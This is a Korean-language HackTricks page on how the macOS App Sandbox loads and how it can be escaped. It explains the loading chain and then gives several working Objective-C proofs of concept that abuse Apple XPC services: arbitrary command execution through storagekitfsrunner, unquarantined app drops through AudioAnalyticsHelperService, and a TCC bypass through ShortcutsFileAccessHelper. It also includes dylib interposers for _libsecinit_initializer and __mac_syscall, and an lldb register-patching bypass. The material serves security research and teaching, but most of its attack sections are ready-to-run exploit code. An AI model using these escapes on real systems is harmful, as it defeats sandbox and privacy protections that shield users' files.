# macOS Sandbox 디버깅 및 우회

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandbox 로딩 과정

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>이미지 출처: <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

이전 이미지에서는 **`com.apple.security.app-sandbox`** entitlement가 있는 애플리케이션이 실행될 때 **Sandbox가 로드되는 방식**을 확인할 수 있습니다.

컴파일러는 `/usr/lib/libSystem.B.dylib`를 바이너리에 link합니다.

그런 다음 **`libSystem.B`**가 여러 함수를 호출하고, **`xpc_pipe_routine`**이 애플리케이션의 entitlements를 **`securityd`**로 전송합니다. Securityd는 프로세스를 Sandbox 내부에 격리해야 하는지 확인하고, 필요한 경우 격리합니다.\
마지막으로 **`__sandbox_ms`**를 호출하여 Sandbox를 활성화하며, 이 함수는 **`__mac_syscall`**을 호출합니다.<sup>[[1]](#references)[[3]](#references)</sup>

## 가능한 우회 방법

### quarantine attribute 우회

**Sandbox된 프로세스가 생성한 파일**에는 Sandbox escape를 방지하기 위해 **quarantine attribute**가 추가됩니다. 새 애플리케이션을 생성하고 실행하려고 하면 quarantine flag가 실행을 차단합니다. 따라서 **quarantine attribute 없이 파일이나 폴더를 생성할 수 있다면 App Sandbox를 탈출할 수 있습니다** — `.app` bundle을 생성한 다음 `open`으로 실행하면 됩니다. 새로 실행된 프로세스는 사용자의 Sandbox가 아니라 LaunchServices에서 실행되기 때문입니다.

**quarantine되지 않은 파일을 생성하는** 안정적인 방법은 **다른 프로세스에 파일 생성을 요청하는 것**입니다. Mickey Jin의 [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명된 것처럼, **App Sandbox**는 생성된 파일에 quarantine을 설정하지만 **Service Sandbox에서 실행되는 XPC services는 그렇지 않습니다**. 따라서 인증되지 않은 여러 XPC services를 "quarantine laundering" primitive로 사용할 수 있습니다:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) 및 **CVE-2023-32414** (`ArchiveService`): Sandbox된 앱이 전달한 archive를 선택한 위치에 추출하며, 추출된 콘텐츠에 **quarantine xattr를 전파하지 않습니다**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:`의 path traversal을 통해 **quarantine 없이 임의의 디렉터리를 생성**할 수 있으며, 이를 이용하면 container 외부에 전체 `.app` bundle 구조를 만들 수 있습니다.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantine된 DMG를 attach하지만 **그 결과 생성되는 device에는 quarantine을 설정하지 않으므로**, mount된 volume의 앱을 실행할 수 있습니다.

> [!TIP]
> 추출 과정에서는 일반적으로 **executable permission bit가 제거됩니다**. CVE-2023-27944에서 사용된 workaround는 bundle의 main executable로 기존에 서명된 시스템 바이너리(예: `/System/Library/CoreServices/Automator Application Stub`)를 가리키는 **symlink**를 배치하는 것이었습니다. 이렇게 하면 생성된 파일에 `+x`가 없어도 실행할 수 있습니다.

> [!CAUTION]
> 이것이 작동하는 이유는 검사가 실행되는 항목의 **flag에 의해 결정되기 때문**입니다: *"Finder 또는 GUI에서 앱이나 기타 executable code를 실행하면 macOS는 해당 항목을 로드하기 전에 quarantine flag를 확인합니다"*. 그런 다음에야 *"전체적인 'first run' security checks를 위해 Gatekeeper로 전달됩니다"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). 실행하는 bundle에 flag가 없으면 Gatekeeper 검사가 수행되지 않습니다 — 바로 이것이 위 CVE들이 제공하는 primitive입니다.<sup>[[5]](#references)</sup>
>
> `.app` bundle이 이미 실행 허가를 받은 경우(즉, "authorized to run" flag가 설정된 quarantine xattr가 있는 경우)에도 이를 abuse할 수 있습니다... 다만 이제는 일부 privileged TCC perms가 없으면 **`.app`** bundles 내부에 쓸 수 없습니다. Sandbox 내부에서는 이러한 권한을 갖지 못합니다.

### Open 기능 abuse

[**Word Sandbox bypass의 마지막 예시**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)에서는 **`open`** cli functionality를 abuse하여 Sandbox를 우회하는 방법을 확인할 수 있습니다.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

애플리케이션이 **Sandbox되도록 설계되어 있더라도**(`com.apple.security.app-sandbox`), 예를 들어 **LaunchAgent**(`~/Library/LaunchAgents`)에서 실행되도록 하면 Sandbox를 우회할 수 있습니다.\
[**이 게시물**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)에서 설명하듯이, Sandbox된 애플리케이션으로 persistence를 확보하려면 해당 애플리케이션이 LaunchAgent로 자동 실행되도록 만들고 DyLib environment variables를 통해 malicious code를 inject할 수 있습니다.<sup>[[6]](#references)</sup>

### Auto Start Locations abuse

Sandbox된 프로세스가 **나중에 Sandbox되지 않은 애플리케이션이 바이너리를 실행할 위치에 쓸 수 있다면**, 해당 위치에 바이너리를 **배치하는 것만으로 escape**할 수 있습니다. 이러한 위치의 좋은 예로 `~/Library/LaunchAgents` 또는 `/System/Library/LaunchDaemons`가 있습니다.

이 작업에는 **2단계**가 필요할 수도 있습니다. **더 permissive한 Sandbox**(`file-read*`, `file-write*`)를 사용하는 프로세스가 실제로는 바이너리를 **Sandbox되지 않은 상태로 실행될 위치에 쓰는** 코드를 실행하도록 만드는 것입니다.

**Auto Start locations**에 대한 이 페이지를 확인하십시오:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### 다른 프로세스 abuse

Sandbox된 프로세스에서 더 제한이 적은 Sandbox(또는 Sandbox가 없는 환경)에서 실행 중인 **다른 프로세스를 compromise**할 수 있다면, 해당 프로세스의 Sandbox로 escape할 수 있습니다:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### 사용 가능한 System 및 User Mach services

Sandbox는 profile `application.sb`에 정의된 XPC를 통해 특정 **Mach services**와 통신할 수 있도록 허용합니다. 이러한 services 중 하나를 **abuse**할 수 있다면 **Sandbox를 escape**할 수 있습니다.

[이 writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에 설명된 것처럼 Mach services에 대한 정보는 `/System/Library/xpc/launchd.plist`에 저장됩니다. 해당 파일에서 `<string>System</string>` 및 `<string>User</string>`를 검색하면 모든 System 및 User Mach services를 찾을 수 있습니다.<sup>[[4]](#references)</sup>

또한 `bootstrap_look_up`을 호출하여 Sandbox된 애플리케이션에서 Mach service를 사용할 수 있는지 확인할 수 있습니다:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### 사용 가능한 PID Mach services

이러한 Mach services는 [이 writeup에서 sandbox를 탈출하기 위해 처음 악용되었습니다](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). 당시에는 애플리케이션과 해당 framework에 필요한 **모든 XPC services**가 애플리케이션의 PID domain에서 표시되었습니다(`ServiceType`이 `Application`인 Mach Services).<sup>[[4]](#references)</sup>

**PID Domain XPC service에 연결**하려면 다음과 같은 한 줄을 사용하여 애플리케이션 내부에 등록하기만 하면 됩니다:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
또한 `System/Library/xpc/launchd.plist`에서 `<string>Application</string>`을 검색하면 모든 **Application** Mach 서비스를 찾을 수 있습니다.

유효한 xpc 서비스를 찾는 또 다른 방법은 다음 위치에 있는 서비스를 확인하는 것입니다:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
이 technique을 악용하는 여러 예시는 [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)에서 확인할 수 있으며, 다음은 일부 요약된 예시입니다.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

이 service는 항상 `YES`를 반환하여 모든 XPC connection을 허용하며, `runTask:arguments:withReply:` method는 임의의 params를 사용해 임의의 command를 실행합니다.

해당 exploit은 "다음처럼 간단했습니다":
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

이 XPC service는 항상 `YES`를 반환하여 모든 client를 허용했으며, `createZipAtPath:hourThreshold:withReply:` method는 폴더의 path를 받아 ZIP file로 압축했습니다.

따라서 가짜 app folder structure를 생성하고 압축한 다음, 압축을 해제하여 실행함으로써 sandbox를 탈출할 수 있습니다. 새 file에는 quarantine attribute가 적용되지 않기 때문입니다.

exploit은 다음과 같았습니다:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

이 XPC service는 어떤 연결이든 허용하는 `extendAccessToURL:completion:` 메서드를 통해 XPC client에 임의의 URL에 대한 읽기 및 쓰기 access를 부여할 수 있습니다. XPC service에 FDA가 있으므로 이러한 권한을 악용하여 TCC를 완전히 우회할 수 있습니다.

exploit은 다음과 같습니다:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### 정적 컴파일 및 동적 linking

[**이 연구**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)에서는 Sandbox를 우회하는 2가지 방법을 발견했습니다. Sandbox는 **libSystem** library가 로드될 때 userland에서 적용되기 때문입니다. binary가 해당 library의 로드를 피할 수 있다면 Sandbox가 적용되지 않습니다:<sup>[[2]](#references)</sup>

- binary가 **완전히 정적으로 컴파일**되었다면 해당 library의 로드를 피할 수 있습니다.
- **binary가 어떤 library도 로드할 필요가 없다면** (linker도 libSystem에 있기 때문에), libSystem을 로드할 필요가 없습니다.

### Shellcodes

ARM64의 **shellcodes**조차 `libSystem.dylib`에 link되어야 한다는 점에 유의하세요:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 상속되지 않는 제한

**[이 writeup의 bonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**에서 설명한 것처럼, 다음과 같은 sandbox restriction은:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
예를 들어 다음을 실행하는 새 프로세스로 우회할 수 있습니다:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
하지만 물론, 이 새 process는 parent process의 entitlements 또는 privileges를 상속하지 않습니다.

### Entitlements

애플리케이션에 다음과 같은 특정 **entitlement**이 있으면 일부 **actions**가 **sandbox에서 허용될 수 있음**에 유의하세요.
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting**에 대한 자세한 내용은 다음을 확인하세요:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer`하여 sandbox 방지
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Sandbox를 방지하기 위해 `__mac_syscall` Interpose
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldb로 Sandbox 디버깅 및 우회

Sandbox가 적용되어야 하는 애플리케이션을 컴파일해 보겠습니다:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

그런 다음 앱을 컴파일합니다:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> 앱은 **`~/Desktop/del.txt`** 파일을 **읽으려고** 시도하지만, **Sandbox는 이를 허용하지 않습니다**.\
> Sandbox가 우회되면 해당 파일을 읽을 수 있으므로 그 위치에 파일을 생성하세요:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Sandbox가 언제 로드되는지 확인하기 위해 애플리케이션을 debug해 보겠습니다:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Sandbox를 우회해도 TCC**는 프로세스가 데스크톱의 파일을 읽도록 허용할지 사용자에게 묻습니다

## References

- [1] [Jonathan Levin - Apple Sandbox: 수렁 속으로 더 깊이 (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: 수렁 속으로 더 깊이 (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - macOS Sandbox Escape의 새로운 시대](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - 설명: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): DyLib Injection을 사용한 Telegram 기반 macOS TCC Bypass (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
